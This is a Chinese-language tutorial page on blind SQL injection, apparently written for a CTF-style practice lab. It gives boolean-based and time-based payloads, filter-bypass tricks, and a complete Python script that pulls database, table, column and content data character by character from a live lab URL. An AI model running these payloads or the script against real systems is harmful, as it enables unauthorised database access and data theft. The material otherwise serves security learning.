---
sidebar: auto
---

# sql盲注

[->地址点这里<-](http://106.54.188.129/)

## 基于布尔（莫得过滤的情况）
特征：当页面虽然不能返回查询的结果，但是对于输入 布尔值 0 和 1 的反应是不同的
一般采用二分法
可以使用 
`1' and '1'='1`
`1‘ and 1=1 #`
`1' ^   ^'1'='1

### 数据库的数量（好像没啥必要）
`1'and ((select count(*) from information_schema.schemata) >5 ) and '1'='1`

### 数据库的长度
`1'and ((select length(schema_name) from information_schema.schemata limit 0,1) >1 ) and '1'='1` 
或者↓更简单
`1'and ((select length(database())) >1 ) and '1'='1` 

### 数据库名字
用substr和ascii函数
`1' and ((select ascii(substr(schema_name,1,1)) from information_schema.schemata limit 0,1)>1) and '1' = '1` 
或者
`1'and ((select ascii(substr(database(),1,1))) >1 ) and '1'='1` 

### 表
1. 数量
`1'and ((select count(*) from information_schema.tables where table_schema = 'flag' ) >5 ) and '1'='1`
2. 长度
`1'and ((select length(table_name) from information_schema.tables where table_schema = 'flag'  limit 0,1) >8 ) and '1'='1`
3. 名称
`1' and ((select ascii(substr(table_name,1,1)) from information_schema.tables where table_schema = 'flag'  limit 0,1)>1) and '1'='1`
### 字段
1. 数量
`1' and ((select count(column_name)  from information_schema.columns where table_schema='flag' and table_name='true_flag')>1) and '1'='1`
2. 长度
`1' and ((select length(column_name)  from information_schema.columns where table_schema='flag' and table_name='true_flag' limit 0,1)>1) and '1'='1`
2. 字段名
`1' and ((select ascii(substr(column_name,1,1))  from information_schema.columns where table_schema='flag' and table_name='true_flag' limit 0,1) > 104 ) and '1'='1`
### 内容
1. 数量
`1' and ((select count(*) from flag.true_flag)>1) and '1'='1`
2. 长度
`1' and ((select length(flag) from flag.true_flag limit 0,1)>1) and '1'='1`
3. ascii
`1' and ((select ascii(substr(flag,1,1)) from flag.true_flag limit 0,1)>1) and '1'='1`

### 另外
数量也可以通过
`order by`子句判断返回的列数。当构造order by为5时，界面无回显、值为4时有回显。所以列数应该是4


### payload
原理都知道了，就用python写个程序爆破一下
```python
import requests

url="http://106.54.188.129/lev1/verify.php?id=";



def GetDatabase():
    i = 1
    j = 255
    while(i<=j):
        m = (i+j)//2
        id = "1'and ((select count(*) from information_schema.schemata) >%d ) and '1'='1" %(m)
        re = requests.request("get", url+id).text;
        if tip in re:
            i = m + 1
        else:
            j = m -1
    GetDatabaseLength(i)
def GetDatabaseLength(n):
    for k in range(n):
        i = 1
        j = 255
        while (i <= j):
            m = (i + j) // 2
            id = "1'and ((select length(schema_name) from information_schema.schemata limit %d,1) >%d ) and '1'='1" % (k,m)
            re = requests.request("get", url + id).text;
            if tip in re:
                i = m + 1
            else:
                j = m - 1
        GetDatabaseName(k,i)
def GetDatabaseName(n,len):
    for k in range(len):
        i = 1
        j = 127
        while (i <= j):
            m = (i + j) // 2
            id = "1' and ((select ascii(substr(schema_name,%d,1)) from information_schema.schemata limit %d,1)>%d) and '1' = '1" % (k+1,n, m)
            re = requests.request("get", url + id).text;
            if tip in re:
                i = m + 1
            else:
                j = m - 1
        print(chr(i),end='')
    print()
def GetTable():
    i = 1
    j = 255
    while (i <= j):
        m = (i + j) // 2
        id = "1'and ((select count(*) from information_schema.tables where table_schema = '%s' ) >%d ) and '1'='1" % (dbname,m)
        re = requests.request("get", url + id).text;
        if tip in re:
            i = m + 1
        else:
            j = m - 1
    GetTableLength(i)
def GetTableLength(n):
    for k in range(n):
        i = 1
        j = 255
        while (i <= j):
            m = (i + j) // 2
            id = "1'and ((select length(table_name) from information_schema.tables where table_schema = '%s'  limit %d,1) >%d ) and '1'='1" % (dbname,
            k, m)
            re = requests.request("get", url + id).text;
            if tip in re:
                i = m + 1
            else:
                j = m - 1
        GetTableName(k,i)
def GetTableName(n,len):
    for k in range(len):
        i = 1
        j = 127
        while (i <= j):
            m = (i + j) // 2
            id = "1'and ((select ascii(substr(table_name,%d,1)) from information_schema.tables where table_schema = '%s'  limit %d,1)>%d) and '1'='1" % (k+1,dbname,n, m)
            re = requests.request("get", url + id).text;
            if tip in re:
                i = m + 1
            else:
                j = m - 1
        print(chr(i),end='')
    print()
def GetColumn():
    i = 1
    j = 255
    while (i <= j):
        m = (i + j) // 2
        id = "1' and ((select count(column_name)  from information_schema.columns where table_schema='%s' and table_name='%s')>%d) and '1'='1" % (dbname, tbname, m)
        re = requests.request("get", url + id).text;
        if tip in re:
            i = m + 1
        else:
            j = m - 1
    GetColumnLength(i)

def GetColumnLength(n):
    for k in range(n):
        i = 1
        j = 255
        while (i <= j):
            m = (i + j) // 2
            id = "1' and ((select length(column_name)  from information_schema.columns where table_schema='%s' and table_name='%s' limit %d,1) > %d ) and '1'='1" % (dbname, tbname, k, m)
            re = requests.request("get", url + id).text;
            if tip in re:
                i = m + 1
            else:
                j = m - 1
        GetColumnName(k, i)
def GetColumnName(n,len):
    for k in range(len):
        i = 1
        j = 255
        while (i <= j):
            m = (i + j) // 2
            id = "1' and ((select ascii(substr(column_name,%d,1))  from information_schema.columns where table_schema='%s' and table_name='%s' limit %d,1) > %d ) and '1'='1" % (k+1, dbname, tbname, n, m)
            re = requests.request("get", url + id).text;
            if tip in re:
                i = m + 1
            else:
                j = m - 1
        print(chr(i),end='')
    print()
def GetContent():
    i = 1
    j = 255
    while (i <= j):
        m = (i + j) // 2
        id = "1' and ((select count(*) from %s.%s)>%d) and '1'='1" % (dbname,tbname,m)
        re = requests.request("get", url + id).text;
        if tip in re:
            i = m + 1
        else:
            j = m - 1
    GetContentLength(i)
def GetContentLength(n):
    for k in range(n):
        i = 1
        j = 255
        while(i<=j):
            m = (i+j)//2
            id = "1' and ((select length(%s) from %s.%s limit %d,1)>%d) and '1'='1" %(column,dbname,tbname,k,m)
            re = requests.request("get", url + id).text;
            if tip in re:
                i = m + 1
            else:
                j = m - 1
        GetContentName(k,i)
def GetContentName(n,len):
    for k in range(len):
        i = 1
        j = 127
        while (i <= j):
            m = (i + j) // 2
            id = "1' and ((select ascii(substr(%s,%d,1)) from %s.%s limit %d,1)>%d) and '1'='1" % (column,k+1, dbname, tbname, n, m)
            re = requests.request("get", url + id).text;
            if tip in re:
                i = m + 1
            else:
                j = m - 1
        print(chr(i),end='')
    print()

tip = 'yiiiiiiiiiii'
GetDatabase()
dbname = input("Please input the dbname:")
GetTable()
tbname = input("please input the table name:")
GetColumn()
column = input("please input the column name:")
GetContent()
```

## 有绕过时

1. `,` 可以用 `substring(str from 1 for 1)`代替	
2. 空格 
	1. 用注释替换空格：/* */
	2. 括号绕过空格
3. 引号 将字符表示成16进制
4. `=` 可以用 like
4. 比较符号< > 用greatest(char,64)=64 进行大小判断
5. 一些关键字像union，select，where，and,or等
	1. /* */
	2. 大小写绕过 如UnioN
	3. 双关键字绕过 如anandd
	4. 比如`1'^ ((select length(database())) >1 ) ^1#` 

## 基于时间的盲注
条件：如果没有显示任何值时
`1' and (if(条件表达式, 1,sleep(2))) #`

